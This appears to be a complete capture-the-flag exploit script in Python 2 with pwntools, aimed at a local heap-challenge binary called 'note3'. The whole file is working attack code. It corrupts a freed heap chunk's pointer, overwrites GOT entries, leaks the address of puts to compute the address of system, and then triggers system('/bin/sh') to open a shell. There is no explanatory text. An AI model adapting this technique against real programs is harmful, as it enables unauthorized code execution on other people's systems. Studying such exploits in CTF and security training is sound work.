#!/usr/bin/env python
import pwn
import re


p = pwn.process(['./note3'])
pwn.context.terminal = ['tmux', 'splitw', '-h', '-p', '75']

putstosys = -0x2DF90

def add_note(length, content, rec = 1, sen = 0):
    if rec == 1:
        p.recvuntil("option--->>")
    p.sendline("1")
    p.recvuntil("1024)")
    p.sendline(str(length))
    p.recvuntil("content:")
    if sen == 0:
        p.sendline(content)
    else:
        p.send(content)
    return

def show_note():
    p.recvuntil("option--->>")
    p.sendline("2")
    p.recvuntil("leak.")
    return

def edit_note(ID, content, rec = 1, sen = 0):
    if rec  == 1:
        p.recvuntil("option--->>")
    p.sendline("3")
    p.recvuntil("note:")
    p.sendline(str(ID))
    p.recvuntil("content:")
    if sen == 0:
        p.sendline(content)
    else:
        p.send(content)
    return

def delete_note(ID, rec = 1):
    if rec == 1:
        p.recvuntil("option--->>")
    p.sendline("4")
    p.recvuntil("note:")
    p.sendline(str(ID))
    return

def quit(rec = 1):
    if rec == 1:
        p.recvuntil("option--->>")
    p.sendline("5")
    p.recvuntil("Bye-")
    return

add_note(0,"")
add_note(0x20,"AAAA")
delete_note(1)
sen1 = pwn.p64(0)+pwn.p64(0)+pwn.p64(0)+pwn.p64(0x31)+pwn.p64(0x6020c8)
edit_note(0,sen1)
add_note(0x20,"BBBB")
add_note(0x20,pwn.p64(0x6020d0))
edit_note(0,pwn.p32(0x602078))
edit_note(2,pwn.p32(0x602108))
edit_note(0,pwn.p32(0x0))
edit_note(2,pwn.p32(0x6020e0))
edit_note(0,pwn.p32(0x602020))
edit_note(2,pwn.p32(0x602018))
edit_note(0,pwn.p32(0x400D7E).ljust(7,"\x00"))
edit_note(2,pwn.p32(0x602078))
edit_note(0,pwn.p32(0x400D47).ljust(7,"\x00"))
delete_note(3)
p.recvline()
l = p.recvline().strip().ljust(8,"\x00")
la = pwn.util.packing.unpack(l, 'all', endian = 'little', signed = False)
print "[+] Address of puts: "+hex(la)
sys = la + putstosys
print "[+] Address of system: "+hex(sys)
edit_note(1, pwn.p64(sys))
edit_note(2,pwn.p32(0x602018))
edit_note(0, pwn.p32(0x400D92))
add_note(0x30,"/bin/sh")
delete_note(4)
print "[+] Shell spawned."
print "[!] Exit pointer has been overwritten. Use kill $PID to exit."


p.interactive()
